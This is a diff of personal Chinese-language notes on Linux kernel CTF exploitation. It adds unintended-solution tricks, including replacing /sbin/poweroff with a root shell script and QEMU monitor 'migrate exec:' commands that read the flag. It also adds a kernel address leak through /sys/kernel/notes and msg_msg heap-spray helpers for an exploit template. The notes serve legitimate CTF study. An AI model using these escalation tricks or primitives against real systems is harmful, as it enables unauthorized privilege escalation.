@@ -147,7 +147,7 @@ panic=1 oops=panic
 
 ## 0x06. 通过内核堆上泄露程序基地址
 
-内核堆地址`+0x9d000`处存放了函数`secondary_startup_64`函数的地址，可以通过该函数地址泄露程序基地址
+内核堆地址（`page_offset_base`）`+0x9d000`处存放了函数`secondary_startup_64`函数的地址，可以通过该函数地址泄露程序基地址
 
 ## 0x07. 寻找modprobe_path地址
 
@@ -198,6 +198,250 @@ user_ss
 
 **我们知道`swapgs_restore_regs_and_return_to_usermode`函数需要加上一个偏移，具体来说该偏移不是固定的，需要跳过前面的栈操作，从`mov rdi, rsp`开始即可**
 
+又补充：我的理解是从`mov rdi, rsp`开始，但事实上在做别的例如`0ctf_kernote`打`pt_regs`的时候，发现得从`pop rbp`开始。只能说多试一下。
+
+## 0x09. 非预期
+
+整理一些常见非预期：
+
+- 修改`umount`:
+
+![image-20240928132818409](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202409281328503.png)
+
+- 修改`poweroff`：
+
+```bash
+rm /sbin/poweroff
+echo "#!/bin/sh" > /sbin/poweroff
+echo "/bin/sh" >> /sbin/poweroff
+chmod +x /sbin/poweroff
+exit
+cat flag
+```
+
+- 没防止`monitor`：
+
+按下`ctrl+a`，再按`c`，输入：
+
+```bash
+migrate "exec:cp rootfs.img /tmp"
+migrate "exec:cd /tmp;zcat rootfs.img | cpio -idmv 1>&2"
+migrate "exec:cat /tmp/flag 1>&2"
+```
+
+## 0x0A. 或许是非预期的内核地址泄露
+
+利用如下命令：
+
+```bash
+hexdump -C /sys/kernel/notes
+```
+
+可以得到如下形式：
+
+```bash
+/ $ hexdump -C /sys/kernel/notes
+hexdump -C /sys/kernel/notes
+00000000  04 00 00 00 06 00 00 00  06 00 00 00 58 65 6e 00  |............Xen.|
+00000010  6c 69 6e 75 78 00 00 00  04 00 00 00 04 00 00 00  |linux...........|
+00000020  07 00 00 00 58 65 6e 00  32 2e 36 00 04 00 00 00  |....Xen.2.6.....|
+00000030  08 00 00 00 05 00 00 00  58 65 6e 00 78 65 6e 2d  |........Xen.xen-|
+00000040  33 2e 30 00 04 00 00 00  08 00 00 00 03 00 00 00  |3.0.............|
+00000050  58 65 6e 00 00 00 00 80  ff ff ff ff 04 00 00 00  |Xen.............|
+00000060  08 00 00 00 0f 00 00 00  58 65 6e 00 00 00 00 00  |........Xen.....|
+00000070  80 00 00 00 04 00 00 00  08 00 00 00 01 00 00 00  |................|
+00000080  58 65 6e 00 80 11 be 8a  ff ff ff ff 04 00 00 00  |Xen.............|
+00000090  08 00 00 00 02 00 00 00  58 65 6e 00 00 20 20 89  |........Xen..  .|
+000000a0  ff ff ff ff 04 00 00 00  29 00 00 00 0a 00 00 00  |........).......|
+000000b0  58 65 6e 00 21 77 72 69  74 61 62 6c 65 5f 70 61  |Xen.!writable_pa|
+000000c0  67 65 5f 74 61 62 6c 65  73 7c 70 61 65 5f 70 67  |ge_tables|pae_pg|
+000000d0  64 69 72 5f 61 62 6f 76  65 5f 34 67 62 00 00 00  |dir_above_4gb...|
+000000e0  04 00 00 00 04 00 00 00  11 00 00 00 58 65 6e 00  |............Xen.|
+000000f0  01 88 00 00 04 00 00 00  04 00 00 00 09 00 00 00  |................|
+00000100  58 65 6e 00 79 65 73 00  04 00 00 00 08 00 00 00  |Xen.yes.........|
+00000110  08 00 00 00 58 65 6e 00  67 65 6e 65 72 69 63 00  |....Xen.generic.|
+00000120  04 00 00 00 10 00 00 00  0d 00 00 00 58 65 6e 00  |............Xen.|
+00000130  01 00 00 00 00 00 00 00  01 00 00 00 00 00 00 00  |................|
+00000140  04 00 00 00 04 00 00 00  0e 00 00 00 58 65 6e 00  |............Xen.|
+00000150  01 00 00 00 04 00 00 00  04 00 00 00 10 00 00 00  |................|
+00000160  58 65 6e 00 01 00 00 00  04 00 00 00 08 00 00 00  |Xen.............|
+00000170  0c 00 00 00 58 65 6e 00  00 00 00 00 00 80 ff ff  |....Xen.........|
+00000180  04 00 00 00 08 00 00 00  04 00 00 00 58 65 6e 00  |............Xen.|
+00000190  00 00 00 00 00 00 00 00  04 00 00 00 14 00 00 00  |................|
+000001a0  03 00 00 00 47 4e 55 00  1f 67 72 f8 b7 87 9e 24  |....GNU..gr....$|
+000001b0  4c 32 59 6b 38 9e 20 1f  3f 3d c1 c7 06 00 00 00  |L2Yk8. .?=......|
+000001c0  01 00 00 00 00 01 00 00  4c 69 6e 75 78 00 00 00  |........Linux...|
+000001d0  00 00 00 00                                       |....|
+000001d4
+```
+
+如下所示，可以获得一个内核基地址。
+
+![image-20241001143005672](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/image-20241001143005672.png)
+
+## 0x0B. tar命令解析
+
+`tar`命令用得很多，其几个参数效果如下：
+
+```bash
+-x 对.tar格式打包的文件解包
+-c 将文件打包为.tar文件
+-v 显示解压过程
+-f 指定文件
+-z 压缩/解压.gz格式的文件，例如.tar.gz
+-J 压缩/解压.xz格式的文件，例如.tar.xz
+-j 压缩/解压.bzip2格式的文件，例如.tar.bz2
+
+-C 指定输出路径
+```
+
+因此，对于一般`.tar`格式的文件，我们使用如下命令解包：
+
+```bash
+tar -xvf ./file.tar
+```
+
+使用如下命令对`.gz`格式压缩的文件解压缩：
+
+```bash
+tar -xzvf ./file.tar.gz
+```
+
+以及可以指定输出路径：
+
+```bash
+tar -xzvf ./file.tar.gz -C dir
+```
+
+
+
+通过如下方式压缩文件：
+
+```bash
+tar -cvf ./file.tar file1.txt fil2.txt
+```
+
+通过如下方式压缩整个目录：
+
+```bash
+tar -czvf ./file.tar dir
+```
+
+## 0x0C. ext4格式的文件系统
+
+若题目给出一个`.img`格式的文件，则有可能是`ext4`格式的文件系统，如下所示：
+
+```bash
+$ file ./rootfs.img
+./rootfs.img: Linux rev 1.0 ext4 filesystem data, UUID=1a11479a-9bca-4c78-ae24-9c9c0b41d9f4 (needs journal recovery) (extents) (64bit) (large files) (huge files)
+```
+
+则其解压方式如下：
+
+先在`/mnt`下创建一个文件夹用于存放解压后的文件：
+
+```bash
+sudo mkdir -p /mnt/kernote
+```
+
+随后使用`mount`命令来挂载即可：
+
+```bash
+sudo mount ./rootfs.img /mnt/kernote
+```
+
+使用`umount`命令即可自动完成打包并卸载：
+
+```bash
+sudo umount /mnt/kernote
+```
+
+一个示例的`exp.sh`脚本如下：
+
+```bash
+#!/bin/sh
+
+sudo mkdir -p /mnt/kernote
+sudo mount ./rootfs.img /mnt/kernote
+sudo gcc -o /mnt/kernote/exploit ./exp.c -g -masm=intel -static
+sudo umount /mnt/kernote
+```
+
+## 0x0D. kmem_cache_alloc_trace函数
+
+有时候题目不是通过`kmalloc`分配的，而是通过`kmem_cache_alloc_trace`函数。
+
+例如：
+
+```c
+kmem_cache_alloc_trace(kmalloc_caches[5], 0xCC0LL, 8LL, v5, -1LL);
+```
+
+此时需要注意，**第三个参数**才是分配的大小。
+
+## 0x0E. slub和slab分配器的区别
+
+`emmm`这里只记录一个，就是`slub`分配器最小有`kmalloc-8`（`slob`也是`kmalloc-8`），而`slab`最小即为`32`，即`kmalloc-32`
+
+## 0x0F. 四级页表内存布局
+
+位于[这里](https://elixir.bootlin.com/linux/v6.11.5/source/Documentation/arch/x86/x86_64/mm.rst)，一般看四级的。
+
+![image-20241125152811254](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/imagesimage-20241125152811254.png)
+
+## 0x10. 子进程和父进程使用pipe传输数据
+
+解决了一直一来的一个困惑，使用`pipe`就可以了
+
+示例：
+
+```c
+int pipe_fd[2];
+size_t value = 8;
+pipe(pipe_fd);
+
+// 子进程
+write(pipe_fd[1], &value, 8);
+
+// 父进程
+read(pipe_fd[0], &value, 8);
+```
+
+## 0x11. obj的offset的位置
+
+也就是在`freelist`上指向下一个`obj`的`offset`，笔者一直以为在前`8`字节，但实测和`a3`师傅表示`kmem_cache->offset`位于一个偏移处，甚至大于`0x10`。
+
+## 0x12. 使用read_ldt等搜索内存找到flag
+
+在`qemu`使用`-initrd`导入文件系统时，整个文件系统的内容都位于内存中。
+
+所以用`ext4`格式的就不能这样搜索。因为`qemu`会使用`-hda`来引导该文件系统。
+
+## 0xFF. 内核保护配置记录
+
+```bash
+CONFIG_SLAB=y 使用SLAB而不是SLUB
+CONFIG_SLUB=y 使用SLUB而不是SLAB
+CONFIG_SLAB_FREELIST_RANDOM=y 开启Random Freelist
+CONFIG_SLAB_FREELIST_HARDENED=y 开启Hardened Freelist
+CONFIG_HARDENED_USERCOPY=y 开启Hardened Usercopy
+CONFIG_STATIC_USERMODEHELPER=y 开启Static Usermodehelper Path（modprobe_path 为只读，不可修改）
+CONFIG_STATIC_USERMODEHELPER_PATH=""
+```
+
+`rcS`中：
+
+```bash
+echo 1 > /proc/sys/kernel/dmesg_restrict  # 普通用户无法访问dmesg
+echo 0 > /proc/sys/kernel/dmesg_restrict  # 普通用户可以访问dmesg
+
+echo 0 > /proc/sys/kernel/kptr_restrict # 普通用户可以访问/proc/kallsyms
+echo 1 > /proc/sys/kernel/kptr_restrict # 只有root可以访问/proc/kallsyms
+echo 2 > /proc/sys/kernel/kptr_restrict # 任何用户都不可以访问/proc/kallsyms
+```
+
+
+
 # 笔者自用kernel.h模板（到处抄的）
 
 ```c
@@ -214,6 +458,7 @@ user_ss
 #include <poll.h>
 #include <stdint.h>
 #include <sys/syscall.h>
+#include <sys/xattr.h>
 #include <errno.h>
 #include <sched.h>
 #include <sys/types.h>
@@ -240,6 +485,11 @@ size_t kernel_base = 0xffffffff81000000, kernel_offset = -1;
 /**
  * @ show basic information
  */
+
+void leak_info(char* content, size_t value){
+    success("%s => 0x%llx.", content, value);
+}
+
 void info(const char *format, ...)
 {
     va_list args;
@@ -561,8 +811,78 @@ int key_unlink(int keyid)
     return syscall(__NR_keyctl, KEYCTL_UNLINK, keyid, KEY_SPEC_PROCESS_KEYRING);
 }
 
+/**
+ * 0x03. msg_msg相关
+ * 本部分仍然就是摘录于arttnba3师傅的博客
+ */
+
+
+struct list_head {
+    uint64_t    next;
+    uint64_t    prev;
+};
+
+struct msg_msg {
+    struct list_head m_list;
+    uint64_t    m_type;
+    uint64_t    m_ts;
+    uint64_t    next;
+    uint64_t    security;
+};
+
+struct msg_msgseg {
+    uint64_t    next;
+};
+
+/*
+struct msgbuf {
+    long mtype;
+    char mtext[0];
+};
+*/
+
+int get_msg_queue(void)
+{
+    return msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
+}
+
+int read_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
+{
+    return msgrcv(msqid, msgp, msgsz, msgtyp, 0);
+}
+
+/**
+ * the msgp should be a pointer to the `struct msgbuf`,
+ * and the data should be stored in msgbuf.mtext
+ */
+int write_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
+{
+    ((struct msgbuf*)msgp)->mtype = msgtyp;
+    return msgsnd(msqid, msgp, msgsz, 0);
+}
+
+/* for MSG_COPY, `msgtyp` means to read no.msgtyp msg_msg on the queue */
+int peek_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
+{
+    return msgrcv(msqid, msgp, msgsz, msgtyp, 
+                  MSG_COPY | IPC_NOWAIT | MSG_NOERROR);
+}
+
+void build_msg(struct msg_msg *msg, uint64_t m_list_next, uint64_t m_list_prev, 
+              uint64_t m_type, uint64_t m_ts,  uint64_t next, uint64_t security)
+{
+    msg->m_list.next = m_list_next;
+    msg->m_list.prev = m_list_prev;
+    msg->m_type = m_type;
+    msg->m_ts = m_ts;
+    msg->next = next;
+    msg->security = security;
+}
+
+
 
 #endif // LTFALLKERNEL_H
+
 
 ```
 
